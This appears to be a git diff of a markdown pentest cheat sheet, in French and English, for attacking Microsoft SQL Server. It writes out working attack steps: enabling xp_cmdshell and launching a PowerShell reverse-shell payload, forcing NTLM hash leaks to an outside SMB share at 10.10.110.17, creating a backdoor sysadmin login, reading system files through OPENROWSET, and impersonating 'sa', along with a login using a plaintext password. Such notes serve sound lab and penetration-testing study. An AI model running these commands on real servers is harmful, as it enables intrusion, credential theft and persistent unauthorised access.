@@ -128,31 +128,34 @@ mssqlclient.py -p 1433 -windows-auth WIN-02/mssqlsvc:princess1@$TARGET_IP
 
 ### Exploitation
 
-#### Exécution de commandes
+#### Exécution de commandes (xp_cmdshell)
 
 ```
 ------------------------------------------------------------------------
 -- Tentative d activation de xp_cmdshell  (si droits suffisants)
--- To allow advanced options to be changed.  
+-- Allow advanced options to be changed.  
 EXECUTE sp_configure 'show advanced options', 1;
--- To update the currently configured value for advanced options.  
 RECONFIGURE;
+
 -- To enable the feature.  
 EXECUTE sp_configure 'xp_cmdshell', 1;
--- To update the currently configured value for this feature.  
 RECONFIGURE
---  Execution de commande (si xp_cmdshell est activé)
+
+--  Execution de commande (after enabling it)
 xp_cmdshell 'whoami';
-
+xp_cmdshell 'powershell -e <hoaxshell payload>';
 ```
 
-#### Création de compte
-```sql
-------------------------------------------------------------------------
--- Create user with sysadmin privs
-CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';
-EXEC sp_addsrvrolemember 'hacker', 'sysadmin';
+#### Capture de Hash
+
 ```
+-- XP_DIRTREE
+EXEC master..xp_dirtree '\\10.10.110.17\share\'
+
+-- XP_SUBDIRS
+EXEC master..xp_subdirs '\\10.10.110.17\share\'
+```
+
 
 #### Ecriture dans un fichier
 ```
@@ -184,21 +187,19 @@ SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_C
 2> GO
 ```
 
-#### Capture de Hash
-
-```
--- XP_DIRTREE
-EXEC master..xp_dirtree '\\10.10.110.17\share\'
-
--- XP_SUBDIRS
-EXEC master..xp_subdirs '\\10.10.110.17\share\'
+#### Création de compte
+```sql
+------------------------------------------------------------------------
+-- Create user with sysadmin privs
+CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!';
+EXEC sp_addsrvrolemember 'hacker', 'sysadmin';
 ```
 
 #### User Impersonate
 
+Si l'énumération présentée plus haut nous liste des utilisateurs que l'on peut "impersonate" (usurper l'identité), on peut alors utiliser les commande
+
 ```
-
-
 -- Exploitation
 user master; -- db sur laquelle on est sur d'avoir les droits
 EXECUTE AS LOGIN = 'sa';
